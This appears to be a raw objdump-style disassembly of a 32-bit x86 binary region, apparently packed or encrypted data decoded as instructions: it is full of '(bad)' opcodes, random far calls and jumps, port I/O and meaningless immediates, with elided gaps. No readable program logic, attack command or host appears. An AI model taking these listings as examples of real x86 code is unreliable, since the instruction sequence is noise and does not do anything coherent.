  4278b1:	(bad)  [esi-0x32]
  4278b4:	int    0x91
  4278b6:	pop    ss
  4278b7:	inc    ebx
  4278b8:	mov    dl,0xd5
  4278ba:	add    BYTE PTR [ecx+ebp*1-0x783dc1ca],ch
  4278c1:	std    
  4278c2:	pop    ds
  4278c3:	mov    eax,0x91b1e325
  4278c8:	mov    eax,ds:0xd62f9432
  4278cd:	or     eax,0xa1baf89b
  4278d2:	aad    0x84
  4278d4:	add    edx,DWORD PTR [edi]
  4278d6:	xchg   edx,eax
  4278d7:	and    BYTE PTR [eax+0x3b835aa2],ah
  4278dd:	cmp    DWORD PTR ds:0x9fa50bfd,eax
  4278e3:	dec    ecx
  4278e4:	cld    
  4278e5:	stos   DWORD PTR es:[edi],eax
  4278e6:	call   0xfa0f:0x185a4bdc
  4278ed:	imul   esp,DWORD PTR [ecx+0x7e8400c8],0x3f
  4278f4:	adc    ecx,ebx
  4278f6:	mov    edx,DWORD PTR [ebx]
  4278f8:	mov    esi,0x9f30d53d
  4278fd:	fdiv   st,st(6)
  4278ff:	xor    edx,DWORD PTR [eax-0x10]
  427902:	push   eax
  427903:	or     DWORD PTR [edi+esi*2-0x17bbad2a],edi
  42790a:	(bad)  
  42790b:	rcl    BYTE PTR [ecx+edi*1+0x1cf6f8b4],0x34
  427913:	fdivr  DWORD PTR [edi-0x45a1b858]
  427919:	or     eax,0xbe6c8d34
  42791e:	sbb    dl,BYTE PTR [ecx+0x4]
  427921:	xor    eax,0x54d839d3
  427926:	jae    0x4278c5
  427928:	test   eax,0xfd7d582e
  42792d:	jne    0x427915
  42792f:	or     al,0x2a
  427931:	sbb    eax,0xad6a4045
  427936:	arpl   WORD PTR [ebx-0x33585220],bx
  42793c:	mov    ds:0xaef44db5,al
  427941:	mov    ebx,0x8aec8151
  427946:	imul   esp,DWORD PTR [ebp+0x521d9647],0xe8d860a6
  427950:	mov    eax,0x7165e395
  427955:	jbe    0x427918
  427957:	(bad)  
  427958:	cmp    BYTE PTR [esp+eax*2-0x37],bl
  42795c:	mov    ecx,0x9f05b26e
  427961:	stos   BYTE PTR es:[edi],al
  427962:	mov    ds:0x7eab0eb,eax
  427967:	xchg   ebx,eax
  427968:	imul   esp,DWORD PTR [esi],0x87518b09
  42796e:	arpl   WORD PTR [ecx+ecx*2-0x2899670c],cx
  427975:	sub    DWORD PTR [ebp+0x2b],eax
  427978:	jae    0x427985
  42797a:	popf   
  42797b:	cli    
  42797c:	call   0x60c80dd0
  427981:	clc    
  427982:	mov    eax,ds:0x32eeabbc
  427987:	jge    0x42795b
  427989:	retf   
  42798a:	xchg   esp,eax
  42798b:	sbb    bh,ch
  42798d:	push   ebp
  42798e:	out    0x23,al
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	xor    edi,0x4f
  427a02:	leave  
  427a03:	or     BYTE PTR [edi+eiz*4],ah
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	shl    dl,1
  427a0e:	clc    
  427a0f:	cmp    esi,esp
  427a11:	mov    dh,0x3
  427a13:	lahf   
  427a14:	pop    edx
  427a15:	and    eax,0xfd7b692c
  427a1a:	inc    esi
  427a1b:	cs push eax
  427a1d:	mov    dl,0x80
  427a1f:	aad    0x92
  427a21:	mov    ds:0x2dd0c69,eax
  427a26:	mov    BYTE PTR [ebx+0x4eeabd57],0x1c
  427a2d:	add    al,0xb2
  427a2f:	cli    
  427a30:	jmp    0xd1ca:0xb0e035e5
  427a37:	enter  0x1799,0xef
  427a3b:	fdivr  DWORD PTR [esi-0xfe10486]
  427a41:	in     al,0xd0
  427a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a44:	pop    eax
  427a45:	adc    edi,DWORD PTR ds:0xf78fad99
  427a4b:	in     al,0x4
  427a4d:	popf   
  427a4e:	jno    0x427ab5
  427a50:	mov    bl,bl
  427a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a53:	mov    cl,bl
  427a55:	jmp    0x427acb
  427a57:	mov    eax,DWORD PTR [ebp-0x2]
  427a5a:	xchg   DWORD PTR [esi+0x5f5c8b3e],ebp
  427a60:	dec    ecx
  427a61:	inc    ebx
  427a62:	pop    eax
  427a63:	push   esp
  427a64:	mov    bh,0x11
  427a66:	leave  
  427a67:	call   0x9131:0x989ebe95
  427a6e:	(bad)  
  427a6f:	cmp    al,0xe8
  427a71:	mov    esi,0xace7f28e
  427a76:	pop    edi
  427a77:	(bad)  
  427a78:	add    ecx,ebx
  427a7a:	shl    DWORD PTR [edx],cl
  427a7c:	jno    0x427a38
  427a7e:	or     eax,0x531d0588
  427a83:	push   esi
  427a84:	aad    0x7c
  427a86:	lea    edi,[ecx-0x1e]
  427a89:	fabs   
  427a8b:	icebp  
  427a8c:	jmp    FWORD PTR [eax]
  427a8e:	pushf  
  427a8f:	(bad)  
  427a92:	sbb    DWORD PTR ds:0x377e5b2d,0xc50f5f6a
  427a9c:	ins    DWORD PTR es:[edi],dx
  427a9d:	js     0x427a2e
  427a9f:	fsub   DWORD PTR ds:0xd0ac63cd
  427aa5:	jecxz  0x427a61
  427aa7:	nop
  427aa8:	inc    esp
  427aa9:	xchg   ebp,eax
  427aaa:	fimul  WORD PTR [edi-0x5bf14115]
  427ab0:	cmp    eax,0x5e391571
  427ab5:	xchg   DWORD PTR [edx+eax*1],esp
  427ab8:	lea    ebp,[ebp+0x1f]
  427abb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427abc:	sbb    eax,0x9b61dc2f
  427ac1:	sub    eax,0x4a70b52e
  427ac6:	pop    edx
  427ac7:	iret   
  427ac8:	lock rcr DWORD PTR [esi],0x6a
  427acc:	out    dx,eax
  427acd:	aam    0x10
  427acf:	mov    ds:0xa300aa4b,eax
  427ad4:	fnstcw WORD PTR [esp+ebp*1-0x5a7f9bf]
  427adb:	sbb    ebx,DWORD PTR [edx]
  427add:	sub    BYTE PTR [esi-0xf905ff2],bl
  427ae3:	aad    0x9c
  427ae5:	cmp    al,0x80
  427ae7:	cmp    cl,0x67
  427aea:	xchg   ecx,eax
  427aeb:	push   cs
  427aec:	into   
  427aed:	pop    ds
  427aee:	jle    0x427a7b
  427af0:	es rcl bl,0x16
  427af4:	jp     0x427ac2
  427af6:	and    DWORD PTR [ecx+0x69],edi
  427af9:	mov    ch,0xfc
  427afb:	mov    WORD PTR [esi+ebx*2],fs
  427afe:	pop    ebx
  427aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b00:	sub    BYTE PTR [esp+ebx*2],ch
  427b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b04:	aam    0x7b
  427b06:	sbb    ch,BYTE PTR [edx+0x53]
  427b09:	jbe    0x427ac6
  427b0b:	jne    0x427b29
  427b0d:	cmp    cl,BYTE PTR [edi+0x65]
	...
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	div    bl
  427b81:	std    
  427b82:	mov    BYTE PTR [edx+0x28],al
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	inc    ebp
  427b8d:	push   eax
  427b8e:	mov    DWORD PTR [edx],eax
  427b90:	imul   ebp,DWORD PTR [esi+0x4e],0x62
  427b94:	fwait
  427b95:	loope  0x427b5e
  427b97:	add    ah,dh
  427b99:	pop    esi
  427b9a:	adc    dh,cl
  427b9c:	xchg   esi,eax
  427b9d:	pop    esi
  427b9e:	sbb    ebp,esi
  427ba0:	inc    eax
  427ba1:	test   DWORD PTR [ebp+0x158ed9f7],edx
  427ba7:	pop    ebp
  427ba8:	loopne 0x427b59
  427baa:	pop    ebp
  427bab:	cmp    bl,BYTE PTR [eax]
  427bad:	cwde   
  427bae:	cld    
  427baf:	push   esp
  427bb0:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bb2:	stos   DWORD PTR es:[edi],eax
  427bb3:	pusha  
  427bb4:	mov    ds:0xdfb8738f,eax
  427bb9:	mov    dl,0xd4
  427bbb:	xchg   ebp,eax
  427bbc:	jae    0x427b7d
  427bbe:	xchg   edx,eax
  427bbf:	repnz push edx
  427bc1:	jge    0x427b83
  427bc3:	inc    ebp
  427bc4:	xchg   DWORD PTR [eax-0x4a],ebx
  427bc7:	push   cs
  427bc8:	xor    al,0x98
  427bca:	inc    esp
  427bcb:	mov    eax,ds:0x63636468
  427bd0:	jb     0x427bcf
  427bd2:	xchg   ecx,eax
  427bd3:	test   BYTE PTR [ecx+0x12],bl
  427bd6:	daa    
  427bd7:	dec    esi
  427bd8:	sub    BYTE PTR ds:0x1515fbec,bh
  427bde:	(bad)  
  427bdf:	push   ebx
  427be0:	jnp    0x427bc4
  427be2:	in     al,0x6d
  427be4:	mov    edx,0x94393c73
  427be9:	cmp    DWORD PTR [ecx-0x3de35fb5],edi
  427bef:	(bad)  
  427bf0:	mov    dl,0x6f
  427bf2:	xlat   BYTE PTR ds:[ebx]
  427bf3:	mov    WORD PTR [esi],?
  427bf5:	mov    al,0x54
  427bf7:	scas   al,BYTE PTR es:[edi]
  427bf8:	lea    esp,gs:[esi-0x6d16040c]
  427bff:	cmc    
  427c00:	mov    edx,0x702e4ec2
  427c05:	les    esp,FWORD PTR [ebp+0x292192ef]
  427c0b:	and    BYTE PTR [edi+eiz*8],ch
  427c0e:	addr16 pop ds
  427c10:	mov    ah,0xf4
  427c12:	mov    BYTE PTR [ebx],dh
  427c14:	popa   
  427c15:	dec    edx
  427c16:	xchg   edx,eax
  427c17:	fist   DWORD PTR [eax]
  427c19:	pushf  
  427c1a:	outs   dx,BYTE PTR ds:[esi]
  427c1b:	xchg   DWORD PTR [eax-0x30b1f9ea],ebp
  427c21:	test   BYTE PTR [edx+0x2db7ca4f],cl
  427c27:	xor    al,0x54
  427c29:	adc    BYTE PTR [eax+edx*1+0x52],dl
  427c2d:	stos   DWORD PTR es:[edi],eax
  427c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c2f:	jns    0x427c19
  427c31:	jl     0x427bbe
  427c33:	and    ecx,edi
  427c35:	stos   DWORD PTR es:[edi],eax
  427c36:	mov    al,ds:0x88578559
  427c3b:	jge    0x427bc5
  427c3d:	out    dx,al
  427c3e:	cdq    
  427c3f:	mov    bl,bh
  427c41:	loop   0x427c78
  427c43:	pop    esi
  427c44:	sbb    edx,DWORD PTR [edx]
  427c46:	int    0x14
  427c48:	push   ebp
  427c49:	loope  0x427c12
  427c4b:	xor    dh,BYTE PTR [edi-0x44]
  427c4e:	out    0x12,al
  427c50:	cmc    
  427c51:	aad    0x2a
  427c53:	push   cs
  427c54:	popa   
  427c55:	and    BYTE PTR [ebp+0x55],bl
  427c58:	xchg   ebp,eax
  427c59:	xor    BYTE PTR [edx+ecx*4-0x51],0xa
  427c5e:	push   edx
  427c5f:	mov    ds:0x995d1f47,eax
  427c64:	fnstsw WORD PTR [ecx]
  427c66:	jecxz  0x427ca4
  427c68:	mov    dl,0x48
  427c6a:	push   edx
  427c6c:	dec    edi
  427c6d:	sbb    al,0x37
  427c6f:	sbb    BYTE PTR [edi+0x41],bh
  427c72:	jno    0x427c4a
  427c74:	inc    esi
  427c75:	push   esp
  427c76:	inc    eax
  427c77:	cmp    eax,0xd80b4308
  427c7c:	retf   
  427c7d:	and    ah,BYTE PTR [ebx+eiz*4+0x56]
  427c81:	repnz sbb BYTE PTR [ecx-0x41],0x48
  427c86:	mov    dl,0x26
  427c88:	(bad)  
  427c89:	(bad)  
  427c8b:	xor    eax,0x487dd4cb
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x30865d44,ebx
  427d02:	lahf   
  427d03:	cmp    DWORD PTR [ecx+ebp*4],ebp
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	jne    0x427d58
  427d0e:	sub    DWORD PTR [edi-0x444df47b],ecx
  427d14:	add    ch,BYTE PTR [ebx+0x59eb786f]
  427d1a:	es je  0x427d12
  427d1d:	cmp    eax,0x9df0985e
  427d22:	mov    ebp,0x5d1915c2
  427d27:	cmc    
  427d28:	cwde   
  427d29:	push   0x4
  427d2b:	test   al,0xb5
  427d2d:	dec    esi
  427d2e:	es sbb eax,ecx
  427d31:	push   ds
  427d32:	inc    edi
  427d33:	retfw  0xe501
  427d37:	push   cs
  427d38:	and    eax,DWORD PTR [eax]
  427d3a:	sbb    cl,dh
  427d3c:	pop    es
  427d3d:	in     eax,0xda
  427d3f:	xor    eax,0xe5c80a88
  427d44:	inc    edx
  427d45:	sbb    ah,bl
  427d47:	imul   esi,DWORD PTR [ebp+esi*1+0x5255b10e],0x67f1bfd3
  427d52:	cmp    eax,0xfcfe09ce
  427d57:	adc    esi,DWORD PTR [edi+ebx*8+0x4d]
  427d5b:	mov    ah,0x3
  427d5d:	mov    bh,0x37
  427d5f:	in     al,0xda
  427d61:	and    al,0x7f
  427d63:	aaa    
  427d64:	scas   al,BYTE PTR es:[edi]
  427d65:	popf   
  427d66:	inc    esp
  427d67:	sub    ah,bl
  427d69:	push   ss
  427d6a:	sbb    bh,dh
  427d6c:	test   ebp,ebx
  427d6e:	loopne 0x427d3e
  427d70:	push   eax
  427d71:	sub    al,0x2
  427d73:	and    DWORD PTR [ebx+0x47921956],eax
  427d79:	cmp    BYTE PTR [ecx+0x75],0x84
  427d7d:	add    cl,BYTE PTR [ebx+edi*8-0x6768589f]
  427d84:	cdq    
  427d85:	loope  0x427d9c
  427d87:	cwde   
  427d88:	dec    eax
  427d89:	or     eax,esp
  427d8b:	xlat   BYTE PTR ds:[ebx]
  427d8c:	sar    BYTE PTR [eax-0x2c],1
  427d8f:	push   eax
  427d90:	inc    ecx
  427d91:	aam    0xa2
  427d93:	sub    DWORD PTR [edx+0x36],edx
  427d96:	jl     0x427d84
  427d98:	xor    al,0xf5
  427d9a:	nop
  427d9b:	sub    eax,0xc6c3a6b9
  427da0:	pop    edi
  427da1:	aaa    
  427da2:	push   ebp
  427da3:	sub    BYTE PTR [ecx+edi*2+0x28],bh
  427da7:	and    al,0x6d
  427da9:	pusha  
  427daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dab:	sub    eax,0x49494a4
  427db0:	repnz call 0xead7:0x69e33616
  427db8:	stos   DWORD PTR es:[edi],eax
  427db9:	retf   
  427dba:	mov    WORD PTR [edx+0x31bbc27a],?
  427dc0:	icebp  
  427dc1:	cwd    
  427dc3:	pop    es
  427dc4:	(bad)  
  427dc6:	(bad)  
  427dc7:	cmp    cl,BYTE PTR ds:0x6abb2787
  427dcd:	mov    cl,0xf3
  427dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dd0:	and    BYTE PTR [eax],0x27
  427dd3:	mov    ebx,0xd745a7de
  427dd8:	pop    esi
  427dd9:	inc    esp
  427dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ddb:	data16 xor BYTE PTR [ecx+0x5e],0x7c
  427de0:	fcom   QWORD PTR [edi]
  427de2:	sbb    BYTE PTR [edx],al
  427de4:	fsubr  st,st(2)
  427de6:	cmp    eax,0x4a7bac8e
  427deb:	inc    edi
  427dec:	push   ds
  427ded:	xchg   DWORD PTR [edi+0x62e432c9],ecx
  427df3:	ja     0x427db6
  427df5:	js     0x427db6
  427df7:	jecxz  0x427d9f
  427df9:	jmp    0x1622:0xe376c0bb
  427e00:	(bad)  
  427e01:	shl    DWORD PTR [esi+0x1bde272c],1
  427e07:	push   0x791af05d
  427e0c:	icebp  
  427e0d:	aad    0x5b
  427e0f:	cmp    al,BYTE PTR [eax]
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	cld    
  427e81:	in     al,0xa3
  427e83:	add    esi,DWORD PTR [eax]
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	push   es
  427e8d:	stos   DWORD PTR es:[edi],eax
  427e8e:	pop    es
  427e8f:	ss jge 0x427e47
  427e92:	cmp    dh,BYTE PTR [edi-0x70]
  427e95:	lods   al,BYTE PTR ds:[esi]
  427e96:	rol    DWORD PTR [edx-0x51ba0b36],0xa
  427e9d:	ins    BYTE PTR es:[edi],dx
  427e9e:	mov    esi,0xbf2aa752
  427ea3:	out    0x25,al
  427ea5:	mov    eax,0xeefffaea
  427eaa:	or     BYTE PTR [edi],bl
  427eac:	cmp    BYTE PTR [eax],dh
  427eae:	cli    
  427eaf:	mov    esi,0xb22b631a
  427eb4:	arpl   dx,dx
  427eb6:	sar    edx,cl
  427eb8:	int3   
  427eb9:	or     edx,DWORD PTR ds:0xe0ca9d26
  427ebf:	push   ecx
  427ec0:	(bad)  
  427ec1:	jnp    0x427e83
  427ec3:	mov    ebp,0x16aa9e07
  427ec8:	jae    0x427ee8
  427eca:	dec    edi
  427ecb:	mov    al,ds:0x378c6850
  427ed0:	lock jmp 0x813183d3
  427ed6:	mov    al,ds:0xa04a6e9b
  427edb:	mov    ecx,0x375bae0
  427ee0:	cdq    
  427ee1:	jne    0x427eae
  427ee3:	out    dx,al
  427ee4:	fcmovb st,st(3)
  427ee6:	mov    esi,0xa2169b63
  427eeb:	mov    DWORD PTR [edi+esi*4-0x25],edi
  427eef:	mov    BYTE PTR [edx+0x26eb6f38],dh
  427ef5:	mov    bh,0xf9
  427ef7:	adc    DWORD PTR [eax-0x93594bc],eax
  427efd:	lea    edx,[ebp+0x3f830db2]
  427f03:	jno    0x427f34
  427f05:	sbb    BYTE PTR es:[ecx+eax*2],dl
  427f09:	push   esi
  427f0a:	pop    ebp
  427f0b:	add    al,0xa6
  427f0d:	or     ch,BYTE PTR [edi+0x5a2a008c]
  427f13:	pop    ss
  427f14:	sub    eax,0x632dc84e
  427f19:	inc    eax
  427f1a:	fistp  DWORD PTR [edx]
  427f1c:	out    dx,eax
  427f1d:	lea    esp,[esi+0x12e14721]
  427f23:	shl    BYTE PTR [ecx],1
  427f25:	mov    ebp,0xf6ec7c35
  427f2a:	xchg   ecx,eax
  427f2b:	adc    BYTE PTR [edx+0x66c6b55d],dl
  427f31:	(bad)  
  427f32:	mov    bh,0x9
  427f34:	jo     0x427f2e
  427f36:	sbb    dl,0xf5
  427f39:	mov    bh,0xf7
  427f3b:	fdivr  DWORD PTR [esi+0x68504fa8]
  427f41:	(bad)  
  427f42:	and    edx,DWORD PTR [ecx-0x12]
  427f45:	add    al,BYTE PTR [edx]
  427f47:	(bad)  
  427f48:	cld    
  427f49:	xor    bh,BYTE PTR [esi+0x78]
  427f4c:	dec    eax
  427f4d:	lds    eax,FWORD PTR [ecx+0x792365fb]
  427f53:	or     al,0x5f
  427f55:	pusha  
  427f56:	rcl    ch,cl
  427f58:	jg     0x427f01
  427f5a:	sbb    edi,ebx
  427f5c:	and    dl,BYTE PTR [eax+0xb82297b]
  427f62:	cmp    al,0x9c
  427f64:	(bad)  
  427f66:	pop    esi
  427f67:	pop    ebx
  427f68:	stos   DWORD PTR es:[edi],eax
  427f69:	in     eax,dx
  427f6a:	jne    0x427fe3
  427f6c:	mov    ch,0x9a
  427f6e:	loop   0x427f3b
  427f70:	stc    
  427f71:	fld    QWORD PTR [edi+ecx*4+0x117eb7cb]
  427f78:	shl    DWORD PTR [edi+0x36],1
  427f7b:	ss (bad) 
  427f7d:	hlt    
  427f7e:	mov    al,ds:0x67907cd3
  427f83:	inc    esp
  427f84:	ret    
  427f85:	mov    ds:0x794bfdbd,eax
  427f8a:	data16 jae 0x427f95
  427f8d:	cmp    bh,0x96
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	sbb    BYTE PTR [edx],dh
  428002:	stc    
  428003:	fdiv   QWORD PTR [ebx+ebp*4]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	test   eax,0xa77fa0e7
  428011:	dec    edi
  428012:	or     bl,BYTE PTR [ebx+ebx*1-0x6af072ba]
  428019:	sub    al,0x96
  42801b:	sbb    cl,0x4e
  42801e:	inc    esp
  42801f:	cmp    eax,0x6f4c75db
  428024:	push   eax
  428025:	in     al,0xaf
  428027:	fld    DWORD PTR ds:[esi+edi*4+0x3f480a42]
  42802f:	fiadd  DWORD PTR [edi-0x14760673]
  428035:	(bad)  
  428036:	jmp    0x3deaecd5
  42803b:	loope  0x428046
  42803d:	outs   dx,BYTE PTR ds:[esi]
  42803e:	jg     0x42804b
  428040:	mov    ebp,0xea1166bb
  428045:	fisttp QWORD PTR [edi+0x314f0ef1]
  42804c:	ficom  DWORD PTR [ebx+eax*1+0x51]
  428050:	mov    edi,0xc4cbb9a0
  428055:	cmp    esi,ecx
  428057:	fsub   QWORD PTR [ecx-0x5173686e]
  42805d:	aad    0xa9
  42805f:	push   esi
  428060:	inc    ebx
  428061:	iret   
  428062:	xlat   BYTE PTR ds:[ebx]
  428063:	and    ebx,DWORD PTR [edx]
  428065:	push   ebx
  428066:	mov    eax,fs:0x665c043b
  42806c:	pop    esp
  42806d:	(bad)  
  42806e:	mov    edi,0xfecc1218
  428073:	imul   esp,DWORD PTR [edi-0x4d],0x67
  428077:	jle    0x42803a
  428079:	and    DWORD PTR [eax],edx
  42807b:	sbb    bh,BYTE PTR [ebx+0x3bdb08eb]
  428081:	lahf   
  428082:	mov    esp,0xfa517fd0
  428087:	mov    ah,0x5c
  428089:	test   DWORD PTR [eax+0x1c26b16b],edi
  42808f:	mov    eax,ds:0xf2161f6d
  428094:	adc    ebp,ebx
  428096:	and    BYTE PTR [edx+0xe129fdc],al
  42809c:	std    
  42809d:	cmp    DWORD PTR [esp+ebp*2-0x63],0xe110a4bf
  4280a5:	cmp    ch,BYTE PTR [esi-0x49d248fb]
  4280ab:	into   
  4280ac:	ror    DWORD PTR [edx+0x5f5e6d57],cl
  4280b2:	jl     0x428040
  4280b4:	adc    edx,DWORD PTR [edi-0x2f]
  4280b7:	repnz or dh,BYTE PTR [ecx+0x27]
  4280bb:	arpl   WORD PTR cs:[edi],bx
  4280be:	icebp  
  4280bf:	enter  0xf5d3,0x9f
  4280c3:	xchg   ebx,eax
  4280c4:	fsubr  QWORD PTR [eax+eax*8]
  4280c7:	mov    ecx,0x8fdbc7f3
  4280cc:	(bad)  
  4280cd:	mov    edx,0x34959c86
  4280d2:	adc    cl,BYTE PTR [edi-0x376cbca0]
  4280d8:	(bad)  
  4280d9:	mov    esi,0x3bb71f13
  4280de:	sbb    cl,BYTE PTR [esi+edx*4]
  4280e1:	aad    0x5a
  4280e3:	fucomp st(6)
  4280e5:	inc    ebx
  4280e6:	shl    DWORD PTR [esi+0x52],0x84
  4280ea:	cwde   
  4280eb:	ja     0x4280ef
  4280ed:	sar    al,cl
  4280ef:	mov    edi,0x80be39ce
  4280f4:	inc    eax
  4280f5:	out    dx,al
  4280f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280f7:	jno    0x42815f
  4280f9:	in     al,dx
  4280fa:	cdq    
  4280fb:	cmp    ch,BYTE PTR [eax-0x2]
  4280fe:	enter  0xcb3a,0x2e
  428102:	xlat   BYTE PTR ds:[ebx]
  428103:	rcl    esi,0x32
  428106:	and    edx,ecx
  428108:	mov    dl,0x8d
  42810a:	scas   eax,DWORD PTR es:[edi]
  42810b:	fisubr WORD PTR [ebx]
  42810d:	pop    edx
  42810e:	cmp    DWORD PTR [ebp+0x0],eax
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	pushf  
  428181:	dec    ebp
  428182:	cmp    al,0xfe
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    BYTE PTR [ecx+0x52712aca],dh
  428191:	xchg   ebp,eax
  428192:	int    0xba
  428194:	adc    al,0xe5
  428196:	sbb    eax,0x83e29e84
  42819b:	and    DWORD PTR [edi-0x27],ebp
  42819e:	out    0x76,eax
  4281a0:	mov    bl,0x56
  4281a2:	mov    ds:0x80e809ff,al
  4281a7:	inc    ecx
  4281a8:	(bad)  [eax+0x69]
  4281ab:	push   cs
  4281ac:	xchg   edi,eax
  4281ad:	cmp    eax,0x4a20917b
  4281b2:	stc    
  4281b3:	(bad)  
  4281b4:	das    
  4281b5:	and    al,BYTE PTR [esi*1-0x4e4fbdd9]
  4281bc:	lods   eax,DWORD PTR ds:[esi]
  4281bd:	push   edx
  4281be:	fs aaa 
  4281c0:	sbb    eax,0x6356f8a5
  4281c5:	sbb    ah,BYTE PTR [ebp+0x0]
  4281c8:	xchg   esp,eax
  4281c9:	jg     0x4281a6
  4281cb:	sub    edi,DWORD PTR [esi+0x2d4ab41]
  4281d1:	sub    ecx,DWORD PTR [ebp-0x63]
  4281d4:	pop    esp
  4281d5:	xchg   ebp,eax
  4281d6:	push   0x6d455b33
  4281db:	enter  0x26b0,0xc2
  4281df:	jb     0x42818d
  4281e1:	setb   BYTE PTR [esi-0x63]
  4281e5:	mov    al,0x44
  4281e7:	push   edi
  4281e8:	adc    BYTE PTR [eax],0x30
  4281eb:	test   eax,0xc25d268f
  4281f0:	pop    edi
  4281f1:	or     eax,0x4e2225f0
  4281f6:	retf   
  4281f7:	dec    ecx
  4281f8:	jae    0x428279
  4281fa:	mov    WORD PTR [edx-0x6b],es
  4281fd:	pop    edi
  4281fe:	repnz and al,0xdd
  428201:	iret   
  428202:	and    al,ch
  428204:	inc    ecx
  428205:	inc    ecx
  428206:	cmp    edi,DWORD PTR [esi-0x6f]
  428209:	xchg   ebp,eax
  42820a:	jbe    0x428279
  42820c:	push   ecx
  42820d:	bound  esi,QWORD PTR [esi-0x6]
  428210:	sub    al,0x59
  428212:	inc    edx
  428213:	aam    0x2d
  428215:	sbb    DWORD PTR [eax+0x4b],esp
  428218:	sbb    esi,ebx
  42821a:	dec    ecx
  42821b:	rol    BYTE PTR [esi+ecx*2+0x32],0x26
  428220:	cmp    ebx,DWORD PTR [edi-0x3c7a140b]
  428226:	jo     0x428229
  428228:	outs   dx,BYTE PTR ds:[esi]
  428229:	rol    DWORD PTR [esi],cl
  42822b:	pop    esi
  42822c:	cmp    al,0xb4
  42822e:	jl     0x428245
  428230:	ret    
  428231:	and    al,0x6d
  428233:	and    BYTE PTR [edx+0x46e8f6e],dl
  428239:	rol    BYTE PTR [esp+edx*8+0x102ccb91],cl
  428240:	lea    edx,[ecx]
  428242:	out    0xe,eax
  428244:	fisttp QWORD PTR [eax]
  428246:	hlt    
  428247:	test   al,0xd5
  428249:	sbb    al,cl
  42824b:	(bad)  
  42824c:	cli    
  42824d:	cli    
  42824e:	pushf  
  42824f:	push   0x814e7fd4
  428254:	sub    BYTE PTR [edi-0x42],al
  428257:	fld    st(3)
  428259:	(bad)  
  42825a:	mov    DWORD PTR [ebx+0x31ea8821],esi
  428260:	inc    eax
  428261:	fild   WORD PTR [esi+edi*1+0x1dfc973]
  428268:	retf   
  428269:	lock sub al,0x7d
  42826c:	dec    DWORD PTR [ecx+0xe]
  42826f:	in     eax,dx
  428270:	aad    0xdb
  428272:	dec    esp
  428273:	dec    edx
  428274:	imul   edi,eax,0x17e3d1c2
  42827a:	xor    eax,0x645bd0ad
  42827f:	inc    ecx
  428280:	or     ecx,edi
  428282:	cli    
  428283:	pusha  
  428284:	mov    ah,BYTE PTR [esp+edx*8+0x374f835d]
  42828b:	sbb    dl,dh
  42828d:	lea    eax,[ebp+0xc6]
	...
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	sub    DWORD PTR [edx],esp
  428302:	or     ecx,DWORD PTR [eax+0x1ad3c]
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	nop
  42830d:	xor    bl,BYTE PTR [ecx+0x1da87594]
  428313:	stc    
  428314:	mov    BYTE PTR [esi+0x7711f075],al
  42831a:	add    al,0xb3
  42831c:	rol    DWORD PTR [edi+0x5c4979fa],1
  428322:	out    dx,eax
  428323:	xchg   BYTE PTR [eax],cl
  428325:	ss enter 0x8a20,0x38
  42832a:	jge    0x4282fb
  42832c:	not    DWORD PTR [ecx-0xf]
  42832f:	xchg   esp,eax
  428330:	inc    esi
  428331:	mov    edx,edi
  428333:	(bad)  
  428335:	jg     0x42837f
  428337:	adc    DWORD PTR ds:0xc74f7a8d,esp
  42833d:	mov    cl,0xe8
  42833f:	retf   
  428340:	push   cs
  428341:	jp     0x4283ab
  428343:	cmp    BYTE PTR [edx+esi*8+0x7a1667d0],0x82
  42834b:	(bad)  
  42834c:	cld    
  42834d:	pushf  
  42834e:	xchg   edi,eax
  42834f:	adc    dh,BYTE PTR [esi]
  428351:	push   esi
  428352:	mov    ds:0x6c3b20c9,eax
  428357:	retf   0x4418
  42835a:	xchg   ah,bl
